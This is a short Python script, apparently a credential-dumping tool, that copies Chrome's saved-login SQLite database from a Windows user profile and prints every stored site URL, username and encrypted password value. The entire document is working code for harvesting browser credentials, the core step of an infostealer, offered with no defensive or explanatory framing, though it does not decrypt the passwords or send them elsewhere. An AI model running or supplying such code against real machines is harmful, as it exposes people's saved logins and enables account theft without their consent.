
import os
import sqlite3
import shutil

def dump_chrome_passwords():
    chrome_login_db = os.path.expanduser("~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    tmp_db = os.path.expanduser("~\AppData\Local\Temp\LoginDataCopy.db")
    shutil.copy2(chrome_login_db, tmp_db)
    
    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()
    
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        print(f"Site: {row[0]}")
        print(f"User: {row[1]}")
        print(f"Password Encrypted: {row[2]}\n")
    
    conn.close()
    os.remove(tmp_db)

if __name__ == "__main__":
    dump_chrome_passwords()
